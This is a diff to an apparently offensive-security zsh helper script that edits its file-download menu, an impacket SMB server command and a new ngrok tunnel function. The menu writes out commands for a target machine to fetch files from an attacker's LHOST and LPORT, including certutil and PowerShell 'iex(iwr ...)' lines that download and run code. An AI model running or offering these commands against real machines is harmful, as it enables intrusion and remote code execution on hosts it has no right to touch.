@@ -51,7 +51,7 @@ nb-srv-file-download() {
     __ask "Choose a command to copy:"
     echo "1.  certutil -URLcache -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
     echo "2.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
-    echo "3.  iex(iwr http://${__LHOST}:${__LPORT}/$filename)"
+    echo ""
     echo "4.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
     echo "5.  Previous menu"
     echo
@@ -61,7 +61,7 @@ nb-srv-file-download() {
     case $choice in
         1) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
         2) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
-        3) __COMMAND="iex(iwr http://${__LHOST}:${__LPORT}/$filename)";;
+        3) __COMMAND="";;
         4) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
         5) exit;;
         *) echo "Invalid option";;
@@ -112,7 +112,11 @@ nb-srv-ftp() {
 }
 
 nb-srv-smb() {
-	print -z "sudo impacket-smbserver -smb2supp F ."
+	print -z "sudo impacket-smbserver share -smb2support /tmp/smbshare"
+}
+
+nb-srv-ngrok() {
+  print -z "ngrok http 4444"
 }
 
 nb-srv-tftp() {
